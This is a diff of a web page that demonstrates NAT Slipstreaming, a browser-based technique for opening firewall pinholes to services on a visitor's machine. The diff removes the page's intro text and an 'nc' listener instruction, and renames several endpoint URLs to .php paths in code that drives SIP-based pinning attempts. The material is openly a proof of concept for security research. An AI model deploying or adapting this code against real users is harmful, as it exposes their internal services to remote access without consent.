@@ -8,30 +8,6 @@
 
 <div id=acidburn style="visibility: hidden; position: absolute;"></div>
 
-
-<a href="https://blog.decloak.live">https://blog.decloak.live</a> || <a href="https://twitter.com/samykamkar">@samykamkar</a> || <a href="mailto:code@blog.decloak.live">email me</a><hr>
-
-<!--
-<iframe scrolling=no frameborder=0 border=0 src="//blog.decloak.live/list/" width=600px height=160></iframe><br>
--->
-
-<a href="https://blog.decloak.live/slipstream/">NAT Slipstreaming</a> allows an attacker to remotely access any TCP/UDP services bound to a victim machine, bypassing the victim's NAT/firewall (arbitrary firewall pinhole control), just by the victim visiting a website. <a href="https://blog.decloak.live/slipstream/">Full writeup here.</a><p>
-
-<a href="https://github.com/samyk/slipstream/">github.com/samyk/slipstream</a>: NAT Slipstreaming PoC code</a><p>
-
-<p>
-please run:<br>
-<?php 
-$port = @$_GET['port'] ? $_GET['port'] : 3306;
-$port = preg_replace("/[^0-9]/", "", $port); // to fix the xss issue
-?>
-<code>echo something here | (nc -vl <?php echo $port; ?> || nc -vvlp <?php echo $port; ?>)</code><p>
-then hit the button below<br>
-<form name=woot>Port: <input id=port type=text name=port value=<?php echo $port; ?>>
-&nbsp; <input type=button id=button value="please wait" disabled onClick="natpin()"><p>
-</form>
-<hr>
-<br>
 <pre id=log>
 </pre>
 
@@ -355,7 +331,7 @@ function getSize()
 {
 	var scr = document.createElement('script')
 	scr.type = 'text/javascript'
-	scr.src = '//blog.decloak.live/get_size?id=' + rand + '&rand=' + rnd()
+	scr.src = '//blog.decloak.live/get_size.php?id=' + rand + '&rand=' + rnd()
 	log('requesting sniffed packet sizes from server')
 	document.head.appendChild(scr)
 }
@@ -443,7 +419,7 @@ function offset(off, data, origoff)
 				lastOff = off
 
 			log("packet size changed on us, reattempt SIP REGISTER")
-			addScript('//blog.decloak.live/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+			addScript('//blog.decloak.live/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
 			attemptPin(fullpkt)
 		}
 	}
@@ -480,7 +456,7 @@ function tryConnect()
 {
 	log('running: nc -v <?php echo getenv('REMOTE_ADDR') ?> ' + port)
 	log('\n<b>attempting to bypass your NAT/firewall</b>')
-	addScript('//blog.decloak.live/connect?id=' + rand + '&port=' + port)
+	addScript('//blog.decloak.live/connect.php?id=' + rand + '&port=' + port)
 }
 
 // called from /connect (along with some log()s)
@@ -573,7 +549,7 @@ function runpin()
 	fullpkt = s
 
 	// get our sip request from the server, calls offset() if good, otherwise noRespTimer will likely hit
-	addScript('//blog.decloak.live/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+	addScript('//blog.decloak.live/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
 
 	// if we don't get request in a few seconds, something wrong...maybe wrong internal ip if safari
 	noRespTimer = setTimeout(noResponse, 5000)
@@ -720,7 +696,7 @@ function go(type)
 
 function nlog(str)
 {
-	post('//blog.decloak.live/nlog', str)
+	post('//blog.decloak.live/nlog.php', str)
 }
 function gather(sc)
 {
